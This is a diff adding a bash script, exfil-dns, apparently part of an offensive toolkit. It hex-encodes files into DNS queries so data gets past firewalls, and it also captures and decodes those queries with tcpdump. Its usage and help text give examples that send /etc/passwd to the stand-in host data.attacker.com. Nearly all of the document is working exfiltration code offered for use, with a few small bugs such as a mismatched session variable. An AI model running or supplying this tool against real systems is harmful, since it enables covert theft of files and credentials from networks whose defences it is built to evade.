@@ -1,0 +1,195 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/exfil-dns
+# DNS data exfiltration — encode data in DNS queries to bypass firewalls
+# Usage: exfil-dns <mode> [options]
+# Modes: send, receive, encode, test, help
+
+EXFIL_DIR="/opt/cardputer/loot/exfil"
+EXFIL_CONF="/opt/cardputer/config/exfil-dns"
+mkdir -p "$EXFIL_DIR" "$EXFIL_CONF"
+
+DOMAIN="${EXFIL_DOMAIN:-z.example.com}"
+DNS_SERVER="${EXFIL_DNS:-8.8.8.8}"
+CHUNK_SIZE=60
+DELAY=0.1
+TMP_DIR="/tmp/exfil-dns"
+
+encode_chunk() {
+    echo -n "$1" | xxd -p | tr -d '\n' | fold -w "$CHUNK_SIZE"
+}
+
+case "${1:-help}" in
+    send|--send|-s)
+        FILE="${2:-}"
+        DOMAIN="${3:-$DOMAIN}"
+        DELAY="${4:-$DELAY}"
+
+        if [ -z "$FILE" ] || [ ! -f "$FILE" ]; then
+            echo "Usage: exfil-dns send <file> [domain] [delay_sec]"
+            echo ""
+            echo "Example: exfil-dns send /etc/passwd data.attacker.com 0.1"
+            echo ""
+            echo "Set custom defaults:"
+            echo "  EXFIL_DOMAIN=data.attacker.com exfil-dns send <file>"
+            exit 1
+        fi
+
+        FILESIZE=$(stat -c%s "$FILE" 2>/dev/null || stat -f%z "$FILE" 2>/dev/null)
+        FILENAME=$(basename "$FILE")
+        SESSION_ID=$(head -c 4 /dev/urandom | xxd -p)
+
+        echo "[*] DNS Exfiltration — Send Mode"
+        echo "[*] File: $FILE ($FILESIZE bytes)"
+        echo "[*] Domain: $DOMAIN"
+        echo "[*] Delay: ${DELAY}s between queries"
+        echo "[*] Session: $SESSION_ID"
+        echo ""
+
+        # Send start marker: s.<session>.<filename>.<size>.domain
+        START_LABEL="s.${SESSION_ID}.$(echo -n "$FILENAME" | xxd -p | fold -w 60 | tr '\n' '.').${FILESIZE}"
+        dig +short "$START_LABEL.$DOMAIN" @"$DNS_SERVER" > /dev/null 2>&1 &
+        sleep "$DELAY"
+
+        # Encode and send file in chunks
+        TOTAL_CHUNKS=0
+        CHUNK_NUM=0
+        while IFS= read -r chunk; do
+            [ -z "$chunk" ] && continue
+            CHUNK_NUM=$((CHUNK_NUM + 1))
+            LABEL="${SESSION_NUM:-0}.${CHUNK_NUM}.${chunk}"
+            dig +short "$LABEL.$DOMAIN" @"$DNS_SERVER" > /dev/null 2>&1 &
+            TOTAL_CHUNKS=$((TOTAL_CHUNKS + 1))
+            sleep "$DELAY"
+            # Progress every 50 chunks
+            if [ $((TOTAL_CHUNKS % 50)) -eq 0 ]; then
+                echo "[*] Sent $TOTAL_CHUNKS chunks..."
+            fi
+        done < <(encode_chunk "$(<"$FILE")")
+        wait
+
+        # Send end marker: e.<session>.<total_chunks>.domain
+        dig +short "e.${SESSION_ID}.${TOTAL_CHUNKS}.$DOMAIN" @"$DNS_SERVER" > /dev/null 2>&1
+        echo ""
+        echo "[+] Exfiltration complete: $TOTAL_CHUNKS chunks sent"
+        echo "[+] Session ID: $SESSION_ID (use to reconstruct on receiver)"
+        echo "[+] Log saved: $EXFIL_DIR/session_${SESSION_ID}.log"
+        echo "$SESSION_ID $FILENAME $FILESIZE $TOTAL_CHUNKS $(date +%s)" > "$EXFIL_DIR/session_${SESSION_ID}.log"
+        ;;
+
+    receive|--receive|-r)
+        DOMAIN="${2:-$DOMAIN}"
+        IFACE="${3:-eth0}"
+
+        echo "[*] DNS Exfiltration — Receive Mode"
+        echo "[*] Listening for DNS queries to: $DOMAIN"
+        echo "[*] Interface: $IFACE"
+        echo ""
+        echo "[*] Starting DNS capture server..."
+        echo "[*] This requires a DNS server pointing $DOMAIN to this host"
+        echo ""
+
+        mkdir -p "$TMP_DIR"
+
+        # Use tcpdump to capture DNS queries
+        tcpdump -i "$IFACE" -l -n "udp port 53 and host $DOMAIN" 2>/dev/null | while read -r line; do
+            # Extract subdomain from DNS query
+            SUBDOMAIN=$(echo "$line" | grep -oP '[a-f0-9]+\.'"$DOMAIN" | head -1 | sed "s/\\.$DOMAIN$//")
+            [ -z "$SUBDOMAIN" ] && continue
+
+            # Decode session markers
+            if echo "$SUBDOMAIN" | grep -qP '^s\.'; then
+                echo "[*] Session start: $SUBDOMAIN"
+                echo "$SUBDOMAIN" >> "$TMP_DIR/session_start.log"
+            elif echo "$SUBDOMAIN" | grep -qP '^e\.'; then
+                echo "[*] Session end: $SUBDOMAIN"
+                echo "$SUBDOMAIN" >> "$TMP_DIR/session_end.log"
+            else
+                echo "$SUBDOMAIN" >> "$TMP_DIR/chunks.log"
+            fi
+        done
+        ;;
+
+    decode|--decode|-d)
+        INFILE="${2:-}"
+        if [ -z "$INFILE" ] || [ ! -f "$INFILE" ]; then
+            echo "Usage: exfil-dns decode <chunks_file>"
+            echo ""
+            echo "Decodes hex-encoded chunk file back to original data"
+            exit 1
+        fi
+
+        echo "[*] Decoding $INFILE..."
+        # Extract chunk data (after session.chunk prefix), sort by chunk number, concatenate hex, decode
+        OUTFILE="${INFILE%.log}.decoded"
+        while IFS= read -r line; do
+            CHUNK_DATA=$(echo "$line" | cut -d. -f3- | tr -d '.')
+            echo -n "$CHUNK_DATA"
+        done < "$INFILE" | xxd -r -p > "$OUTFILE"
+        echo "[+] Decoded data saved: $OUTFILE ($(stat -c%s "$OUTFILE" 2>/dev/null || stat -f%z "$OUTFILE" 2>/dev/null) bytes)"
+        ;;
+
+    test|--test|-t)
+        DOMAIN="${2:-$DOMAIN}"
+        echo "[*] DNS Exfiltration Test"
+        echo "[*] Testing DNS resolution to $DOMAIN..."
+        RESULT=$(dig +short "$DOMAIN" @"$DNS_SERVER" 2>/dev/null)
+        if [ -n "$RESULT" ]; then
+            echo "[+] Domain $DOMAIN resolves: $RESULT"
+        else
+            echo "[-] Domain $DOMAIN did not resolve"
+            echo "[*] Make sure DNS is configured to point $DOMAIN to your server"
+        fi
+        echo ""
+        echo "[*] Testing encoding pipeline..."
+        TEST_DATA="Hello ZERO-DAY OS!"
+        ENCODED=$(echo -n "$TEST_DATA" | xxd -p | tr -d '\n')
+        DECODED=$(echo "$ENCODED" | xxd -r -p)
+        if [ "$TEST_DATA" = "$DECODED" ]; then
+            echo "[+] Encoding/decoding pipeline: OK"
+        else
+            echo "[!] Encoding/decoding pipeline: FAILED"
+        fi
+        echo ""
+        echo "[*] Estimated exfil speed:"
+        echo "    Chunk size: $CHUNK_SIZE bytes per DNS query"
+        echo "    Delay: ${DELAY}s per query"
+        echo "    Throughput: ~$(echo "scale=0; $CHUNK_SIZE / $DELAY" | bc) bytes/sec"
+        ;;
+
+    help|--help|-h)
+        echo "Usage: exfil-dns <mode> [options]"
+        echo ""
+        echo "DNS Data Exfiltration Tool"
+        echo "Encodes data in DNS queries to bypass firewalls and network restrictions."
+        echo ""
+        echo "Modes:"
+        echo "  send <file> [domain] [delay]   Send file via DNS queries"
+        echo "  receive [domain] [iface]        Listen for DNS exfil queries"
+        echo "  decode <chunks_file>            Decode captured chunks back to file"
+        echo "  test [domain]                   Test DNS resolution and encoding"
+        echo ""
+        echo "Environment variables:"
+        echo "  EXFIL_DOMAIN  — Default domain (default: z.example.com)"
+        echo "  EXFIL_DNS     — DNS server to use (default: 8.8.8.8)"
+        echo ""
+        echo "How it works:"
+        echo "  1. Encode file data as hex subdomains"
+        echo "  2. Send as DNS queries: <session>.<chunk>.<hex>.<domain>"
+        echo "  3. Receiver captures queries via tcpdump"
+        echo "  4. Decode hex back to original data"
+        echo ""
+        echo "Examples:"
+        echo "  exfil-dns send /etc/passwd data.attacker.com"
+        echo "  exfil-dns receive data.attacker.com eth0"
+        echo "  exfil-dns decode chunks.log"
+        echo "  exfil-dns test data.attacker.com"
+        exit 0
+        ;;
+
+    *)
+        echo "[!] Unknown mode: $1"
+        echo "Run: exfil-dns help"
+        exit 1
+        ;;
+esac
